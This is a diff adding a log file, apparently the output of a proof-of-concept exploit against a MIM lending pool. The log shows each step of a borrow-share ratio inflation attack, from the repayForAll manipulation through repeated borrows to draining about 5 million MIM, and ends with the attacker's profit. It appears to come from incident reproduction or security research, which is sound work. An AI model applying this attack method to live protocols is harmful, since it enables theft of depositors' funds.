@@ -1,0 +1,72 @@
+Logs:
+  Exploiter MIM balance before attack 0 18
+  Exploiter WETH balance before attack 0 18
+  
+Initial Ratio Logs
+  Total MIM borrowed(elastic)) 248844382279231396727995  :::: Total borrow Shares(base) 232357690628520295106240
+  elastic : base (approx in 10**3) ====> 1070 : 1000
+  
+Ratio Logs After repayForAll
+  Total MIM borrowed(elastic)) 8851131868470167457568  :::: Total borrow Shares(base) 232357690628520295106240
+  elastic : base (approx) ====> 1 : 26
+  
+Ratio Logs After repaying existing borrowers loans
+  Total MIM borrowed(elastic)) 4837376367858670060438  :::: Total borrow Shares(base) 126989589381283599649834
+  elastic : base (approx) ====> 1 : 26
+  
+Ratio Logs after repaying special user loans
+  Total MIM borrowed(elastic)) 0  :::: Total borrow Shares(base) 97
+  
+Ratio Inflation Atack
+  Total MIM borrowed(elastic)) 1  :::: Total borrow Shares(base) 98
+  elastic : base (approx) ====> 1 : 98
+  
+  Ratio after 1 borrow
+  Total MIM borrowed(elastic)) 2  :::: Total borrow Shares(base) 196
+  elastic : base (approx) ====> 1 : 98
+  
+  Ratio after 11 borrow
+  Total MIM borrowed(elastic)) 2  :::: Total borrow Shares(base) 198658
+  elastic : base (approx) ====> 1 : 99329
+  
+  Ratio after 21 borrow
+  Total MIM borrowed(elastic)) 2  :::: Total borrow Shares(base) 203423746
+  elastic : base (approx) ====> 1 : 101711873
+  
+  Ratio after 31 borrow
+  Total MIM borrowed(elastic)) 2  :::: Total borrow Shares(base) 208305913858
+  elastic : base (approx) ====> 1 : 104152956929
+  
+  Ratio after 41 borrow
+  Total MIM borrowed(elastic)) 2  :::: Total borrow Shares(base) 213305255788546
+  elastic : base (approx) ====> 1 : 106652627894273
+  
+  Ratio after 51 borrow
+  Total MIM borrowed(elastic)) 2  :::: Total borrow Shares(base) 218424581927469058
+  elastic : base (approx) ====> 1 : 109212290963734529
+  
+  Ratio after 61 borrow
+  Total MIM borrowed(elastic)) 2  :::: Total borrow Shares(base) 223666771893728313346
+  elastic : base (approx) ====> 1 : 111833385946864156673
+  
+  Ratio after 71 borrow
+  Total MIM borrowed(elastic)) 2  :::: Total borrow Shares(base) 229034774419177792864258
+  elastic : base (approx) ====> 1 : 114517387209588896432129
+  
+  Ratio after 81 borrow
+  Total MIM borrowed(elastic)) 2  :::: Total borrow Shares(base) 234531609005238059892998146
+  elastic : base (approx) ====> 1 : 117265804502619029946499073
+  
+Ratio Logs before borrowing Total Pool Balance
+  Pool Balance 5000047843134993049370268
+  Total MIM borrowed(elastic)) 0  :::: Total borrow Shares(base) 120080183810681886665215049728
+  
+Ratio Logs after borrowing Total Pool Balance
+  Total MIM borrowed(elastic)) 5000047843134993049370268  :::: Total borrow Shares(base) 120085183858525021658264419996
+  elastic : base (approx) ====> 1 : 24016
+  
+Pool Balance after withdraw 0
+  Attacker's MIM Balance 5049153460855761652642273
+  
+Exploiter MIM balance after attack 349003460855761652642273 18
+  Exploiter WETH balance after attack 1807677833228065417403 18
